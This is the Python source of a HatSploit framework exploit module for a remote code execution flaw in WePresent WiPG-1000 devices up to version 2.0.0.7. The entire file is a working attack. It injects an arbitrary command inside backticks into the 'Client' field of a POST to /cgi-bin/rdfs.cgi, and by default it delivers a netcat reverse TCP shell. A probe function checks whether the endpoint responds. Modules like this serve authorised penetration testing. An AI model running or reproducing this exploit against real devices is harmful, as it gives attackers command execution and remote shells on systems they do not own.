"""
This module requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.module import Module
from hatsploit.lib.handler import Handler
from pex.proto.http import HTTPClient


class HatSploitModule(Module, Handler, HTTPClient):
    details = {
        "Category": "exploit",
        "Name": "WePresent WiPG-1000 Remote Code Execution",
        "Module": "exploit/linux/wepresent/wipg1000_code_execution",
        "Authors": [
            "Ivan Nikolsky (enty8080) - module developer",
            "Matthias Brun - vulnerability researcher",
        ],
        "Description": "Remote Code Execution in WePresent WiPG-1000 <= 2.0.0.7.",
        "Platform": "linux",
        "Rank": "high",
    }

    payload = {
        "Value": "unix/generic/netcat_reverse_tcp",
        "Architectures": ["armle", "aarch64", "generic"],
        "Platforms": ["linux", "unix"],
        "Types": None,
    }

    options = {
        "HOST": {
            "Description": "Remote host.",
            "Value": None,
            "Type": "ip",
            "Required": True,
        },
        "PORT": {
            "Description": "Remote port.",
            "Value": 80,
            "Type": "port",
            "Required": True,
        },
    }

    def exploit(self, remote_host, remote_port, command):
        data = {"Client": f"`{command}`", "Download": "Download"}

        self.http_request(
            method="POST",
            host=remote_host,
            port=remote_port,
            path="/cgi-bin/rdfs.cgi",
            data=data,
        )

    def check(self):
        remote_host, remote_port = self.parse_options(self.options)

        response = self.http_request(
            method="GET", host=remote_host, port=remote_port, path="/cgi-bin/rdfs.cgi"
        )

        if response is None or response.status_code != 200:
            return False

        return True

    def run(self):
        remote_host, remote_port = self.parse_options(self.options)

        self.module_handle(
            host=remote_host,
            method="echo",
            sender=self.exploit,
            args={"remote_host": remote_host, "remote_port": remote_port},
        )
